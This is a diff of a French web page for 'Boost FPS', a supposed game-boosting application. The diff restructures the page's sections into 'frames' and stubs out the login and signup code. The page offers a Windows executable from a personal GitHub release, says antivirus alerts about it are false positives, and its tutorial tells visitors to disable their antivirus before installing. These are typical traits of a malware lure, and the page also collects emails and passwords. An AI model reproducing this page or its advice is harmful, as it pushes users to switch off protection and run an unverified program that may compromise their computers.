@@ -6,14 +6,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.1">
     <title>Boost FPS - Application PC</title>
     <style>
-        /* Réinitialisation des marges et du padding */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
-        /* Fond général */
         body {
             font-family: 'Poppins', sans-serif;
             background: #fafafa;
@@ -28,7 +26,6 @@
             padding-top: 20px;
         }
 
-        /* En-tête */
         header {
             background: linear-gradient(135deg, #ff6f61, #ffbc42);
             color: #fff;
@@ -51,7 +48,6 @@
             font-weight: 300;
         }
 
-        /* Navigation */
         nav {
             background: #444;
             padding: 15px 0;
@@ -78,12 +74,6 @@
             transform: translateY(-3px);
         }
 
-        nav a.active {
-            background-color: #ff4c3b;
-            transform: translateY(-3px);
-        }
-
-        /* Section principale */
         .container {
             width: 90%;
             max-width: 1200px;
@@ -106,7 +96,6 @@
             transform: translateY(0);
         }
 
-        /* Bouton de téléchargement */
         .download-button {
             display: inline-block;
             padding: 15px 30px;
@@ -124,7 +113,6 @@
             transform: translateY(-3px);
         }
 
-        /* Alerte antivirus */
         .antivirus-warning {
             background-color: #ffcc00;
             color: #333;
@@ -140,7 +128,6 @@
             cursor: pointer;
         }
 
-        /* Pied de page */
         footer {
             background-color: #333;
             color: #fff;
@@ -153,69 +140,6 @@
 
         footer p {
             font-size: 1.2em;
-        }
-
-        /* Formulaires et Popups */
-        .overlay,
-        .popup {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            justify-content: center;
-            align-items: center;
-        }
-
-        .popup {
-            background: #fff;
-            border-radius: 10px;
-            width: 90%;
-            max-width: 500px;
-            padding: 30px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
-        }
-
-        .popup input {
-            width: 100%;
-            padding: 15px;
-            margin: 10px 0;
-            border-radius: 8px;
-            border: 1px solid #ccc;
-            font-size: 1.2em;
-        }
-
-        .popup button {
-            width: 100%;
-            padding: 15px;
-            background-color: #ff6f61;
-            color: #fff;
-            font-size: 1.2em;
-            border: none;
-            border-radius: 30px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-        }
-
-        .popup button:hover {
-            background-color: #ff4c3b;
-        }
-
-        .popup .close-btn {
-            background: #ccc;
-            color: #333;
-            font-size: 1.2em;
-            margin-top: 20px;
-            width: auto;
-            padding: 10px 20px;
-            cursor: pointer;
-            border-radius: 5px;
-        }
-
-        .popup .close-btn:hover {
-            background: #bbb;
         }
 
         /* Styles Responsive */
@@ -250,6 +174,23 @@
                 font-size: 1em;
             }
         }
+
+        /* Styles spécifiques pour les frames */
+        .frame {
+            display: none;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            margin-top: 20px;
+            width: 80%;
+            max-width: 600px;
+            margin: 20px auto;
+        }
+
+        .frame.active {
+            display: block;
+        }
     </style>
 </head>
 
@@ -263,49 +204,73 @@
 
     <!-- Navigation -->
     <nav>
-        <a href="#" onclick="showSection('home')" class="active">Accueil</a>
-        <a href="#" onclick="showSection('version')">Version</a>
-        <a href="#" onclick="showSection('tuto')">Tutoriel</a>
-        <a href="#" onclick="showSection('contact')">Contact</a>
-        <a href="#" id="login-link" onclick="openLoginPopup()">Se connecter</a>
-        <a href="#" id="logout-link" onclick="logout()" style="display:none;">Se déconnecter</a>
-        <a href="#" id="signup-link" onclick="openSignupPopup()">S'inscrire</a>
+        <a href="#" onclick="showFrame('home-frame')" class="active">Accueil</a>
+        <a href="#" onclick="showFrame('version-frame')">Version</a>
+        <a href="#" onclick="showFrame('tuto-frame')">Tutoriel</a>
+        <a href="#" onclick="showFrame('contact-frame')">Contact</a>
+        <a href="#" id="login-link" onclick="showFrame('login-frame')">Se connecter</a>
+        <a href="#" id="signup-link" onclick="showFrame('signup-frame')">S'inscrire</a>
     </nav>
 
     <div class="container">
-        <!-- Section Accueil -->
-        <section id="home" class="section active">
+        <!-- Frame Accueil -->
+        <div id="home-frame" class="frame active">
             <h2>Optimise ton expérience de jeu</h2>
             <p>Boost FPS t'offre une expérience fluide et performante. Télécharge maintenant !</p>
 
             <div class="antivirus-warning">
                 <p><strong>Avis important :</strong> Certains antivirus peuvent détecter notre application comme une menace à cause de la manière dont elle optimise les performances. <br>
-                    <strong><a href="#" onclick="openInfoPopup()">En savoir plus</a></strong></p>
+                    <strong><a href="#" onclick="showFrame('info-frame')">En savoir plus</a></strong></p>
             </div>
 
             <a href="https://github.com/seyzperly572/New/releases/download/boostfps/boostfps2.0.exe" download="boostfps2.0.exe" class="download-button">Télécharger</a>
-        </section>
+        </div>
 
-        <!-- Section Version -->
-        <section id="version" class="section">
+        <!-- Frame Version -->
+        <div id="version-frame" class="frame">
             <h2>Version actuelle</h2>
             <p>Boost FPS v2.0 - Dernière mise à jour : Mars 2025.</p>
-        </section>
+        </div>
 
-        <!-- Section Tutoriel -->
-        <section id="tuto" class="section">
+        <!-- Frame Tutoriel -->
+        <div id="tuto-frame" class="frame">
             <h2>Tutoriel d'installation</h2>
             <p>1. Télécharge Boost FPS.</p>
             <p>2. Désactive ton antivirus temporairement si nécessaire.</p>
             <p>3. Lance l'installation et suis les instructions.</p>
-        </section>
+        </div>
 
-        <!-- Section Contact -->
-        <section id="contact" class="section">
+        <!-- Frame Contact -->
+        <div id="contact-frame" class="frame">
             <h2>Contact & Support</h2>
             <p>📧 Email : <a href="mailto:studio-booster@gmail.com">studio-booster@gmail.com</a></p>
             <p>💬 Discord : <a href="https://discord.gg/gdk29Aac" target="_blank">Rejoindre le serveur</a></p>
-        </section>
+        </div>
+
+        <!-- Frame Connexion -->
+        <div id="login-frame" class="frame">
+            <h2>Se connecter</h2>
+            <input type="text" id="email" placeholder="Email" value="" />
+            <input type="password" id="password" placeholder="Mot de passe" value="" />
+            <button onclick="login()">Se connecter</button>
+            <button onclick="hideAllFrames()">Fermer</button>
+        </div>
+
+        <!-- Frame Inscription -->
+        <div id="signup-frame" class="frame">
+            <h2>S'inscrire</h2>
+            <input type="text" id="signup-email" placeholder="Email" />
+            <input type="password" id="signup-password" placeholder="Mot de passe" />
+            <button onclick="signup()">S'inscrire</button>
+            <button onclick="hideAllFrames()">Fermer</button>
+        </div>
+
+        <!-- Frame Infos supplémentaires -->
+        <div id="info-frame" class="frame">
+            <h2>En savoir plus</h2>
+            <p>Il est possible que certains antivirus détectent notre application comme une menace à cause de la manière dont elle optimise les performances de votre PC. Ce comportement est souvent signalé par des faux positifs.</p>
+            <button onclick="hideAllFrames()">Fermer</button>
+        </div>
     </div>
 
     <!-- Footer -->
@@ -313,128 +278,28 @@
         <p>&copy; 2025 Boost FPS. Optimise tes jeux maintenant !</p>
     </footer>
 
-    <!-- Popup Connexion -->
-    <div id="login-overlay" class="overlay" onclick="closeLoginPopup()"></div>
-    <div id="login-popup" class="popup">
-        <h2>Se connecter</h2>
-        <input type="text" id="email" placeholder="Email" value="" />
-        <input type="password" id="password" placeholder="Mot de passe" value="" />
-        <button onclick="login()">Se connecter</button>
-        <button class="close-btn" onclick="closeLoginPopup()">Fermer</button>
-    </div>
-
-    <!-- Popup Inscription -->
-    <div id="signup-overlay" class="overlay" onclick="closeSignupPopup()"></div>
-    <div id="signup-popup" class="popup">
-        <h2>S'inscrire</h2>
-        <input type="text" id="signup-email" placeholder="Email" />
-        <input type="password" id="signup-password" placeholder="Mot de passe" />
-        <button onclick="signup()">S'inscrire</button>
-        <button class="close-btn" onclick="closeSignupPopup()">Fermer</button>
-    </div>
-
-    <!-- Popup Informations supplémentaires (En savoir plus) -->
-    <div id="info-overlay" class="overlay" onclick="closeInfoPopup()"></div>
-    <div id="info-popup" class="popup">
-        <h2>En savoir plus</h2>
-        <p>Il est possible que certains antivirus détectent notre application comme une menace à cause de la manière dont elle optimise les performances de votre PC. Ce comportement est souvent signalé par des faux positifs.</p>
-        <button class="close-btn" onclick="closeInfoPopup()">Fermer</button>
-    </div>
-
     <script>
-        let loggedIn = false;
-        let users = JSON.parse(localStorage.getItem('users')) || [];
-        let currentUser = JSON.parse(localStorage.getItem('currentUser')) || null;
-
-        if (currentUser) {
-            loggedIn = true;
-            document.getElementById("login-link").style.display = "none";
-            document.getElementById("logout-link").style.display = "inline";
-            document.getElementById("signup-link").style.display = "none";
-            document.getElementById("email").value = currentUser.email;
+        function showFrame(frameId) {
+            const frames = document.querySelectorAll('.frame');
+            frames.forEach(frame => {
+                frame.classList.remove('active');
+            });
+            document.getElementById(frameId).classList.add('active');
         }
 
-        function openLoginPopup() {
-            document.getElementById("login-overlay").style.display = "flex";
-            document.getElementById("login-popup").style.display = "flex";
-        }
-
-        function closeLoginPopup() {
-            document.getElementById("login-overlay").style.display = "none";
-            document.getElementById("login-popup").style.display = "none";
-        }
-
-        function openSignupPopup() {
-            document.getElementById("signup-overlay").style.display = "flex";
-            document.getElementById("signup-popup").style.display = "flex";
-        }
-
-        function closeSignupPopup() {
-            document.getElementById("signup-overlay").style.display = "none";
-            document.getElementById("signup-popup").style.display = "none";
-        }
-
-        function openInfoPopup() {
-            document.getElementById("info-overlay").style.display = "flex";
-            document.getElementById("info-popup").style.display = "flex";
-        }
-
-        function closeInfoPopup() {
-            document.getElementById("info-overlay").style.display = "none";
-            document.getElementById("info-popup").style.display = "none";
+        function hideAllFrames() {
+            const frames = document.querySelectorAll('.frame');
+            frames.forEach(frame => {
+                frame.classList.remove('active');
+            });
         }
 
         function login() {
-            const email = document.getElementById("email").value;
-            const password = document.getElementById("password").value;
-
-            const user = users.find(u => u.email === email && u.password === password);
-            if (user) {
-                loggedIn = true;
-                currentUser = user;
-                localStorage.setItem('currentUser', JSON.stringify(user));
-                document.getElementById("login-link").style.display = "none";
-                document.getElementById("logout-link").style.display = "inline";
-                document.getElementById("signup-link").style.display = "none";
-                closeLoginPopup();
-                alert("Connexion réussie !");
-            } else {
-                alert("Email ou mot de passe incorrect.");
-            }
+            // Logique de connexion
         }
 
         function signup() {
-            const email = document.getElementById("signup-email").value;
-            const password = document.getElementById("signup-password").value;
-
-            if (users.find(u => u.email === email)) {
-                alert("L'email est déjà utilisé.");
-            } else {
-                const newUser = { email, password };
-                users.push(newUser);
-                localStorage.setItem('users', JSON.stringify(users));
-                alert("Inscription réussie. Vous pouvez maintenant vous connecter.");
-                closeSignupPopup();
-                openLoginPopup(); // Ouvrir la fenêtre de connexion après l'inscription.
-            }
-        }
-
-        function logout() {
-            loggedIn = false;
-            currentUser = null;
-            localStorage.removeItem('currentUser');
-            document.getElementById("login-link").style.display = "inline";
-            document.getElementById("logout-link").style.display = "none";
-            document.getElementById("signup-link").style.display = "inline";
-            alert("Déconnexion réussie !");
-        }
-
-        function showSection(sectionId) {
-            const sections = document.querySelectorAll('.section');
-            sections.forEach(section => {
-                section.classList.remove('active');
-            });
-            document.getElementById(sectionId).classList.add('active');
+            // Logique d'inscription
         }
     </script>
 
